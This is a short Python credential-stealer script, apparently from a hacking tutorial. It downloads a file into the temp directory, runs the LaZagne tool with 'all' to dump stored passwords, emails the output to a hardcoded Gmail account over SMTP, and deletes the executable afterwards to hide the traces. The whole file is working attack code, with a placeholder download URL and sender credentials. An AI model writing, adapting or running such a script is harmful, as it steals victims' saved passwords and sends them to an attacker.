#!/usr/bin/env pyhton

import requests , subprocess, smtplib, os, tempfile
 
def downloads(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory  = tempfile.gettempdir()
os.chdir(temp_directory)
downloads("")
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("email@gmail.com", "passowrd", result)
os.remove("laZagne.exe")
